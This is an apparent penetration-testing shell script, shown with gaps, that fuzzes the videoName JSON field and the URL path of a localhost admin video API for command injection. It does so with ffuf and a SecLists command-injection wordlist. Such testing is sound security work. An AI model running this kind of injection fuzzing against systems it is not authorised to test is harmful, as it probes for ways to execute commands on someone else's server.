...
# Test command injection in PUT request JSON payload
echo "Testing command injection in PUT /identity/api/v2/admin/videos/5252 - videoName field"
echo "===================================================================================="

# Create a temporary file to store payloads with JSON format
echo "Creating JSON payloads..."
mkdir -p payloads
while IFS= read -r payload; do
    # Escape the payload for JSON
    escaped_payload=$(echo "$payload" | sed 's/"/\\"/g' | sed 's/\\/\\\\/g')
    echo "{\"videoName\":\"test${escaped_payload}.mp4\"}"
done < SecLists/Fuzzing/command-injection-commix.txt > payloads/json_payloads.txt

# Test command injection in videoName field
ffuf -w payloads/json_payloads.txt \
  -u "http://localhost:8888/identity/api/v2/admin/videos/5252" \
  -X PUT \
...
# Also test in the URL path
echo -e "\n\nTesting command injection in PUT URL path"
echo "=========================================="
ffuf -w SecLists/Fuzzing/command-injection-commix.txt \
  ...
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Connection: keep-alive" \
  -d '{"videoName":"test.mp4"}' \
  -mc all \
  -o put_url_results.txt \
  -of json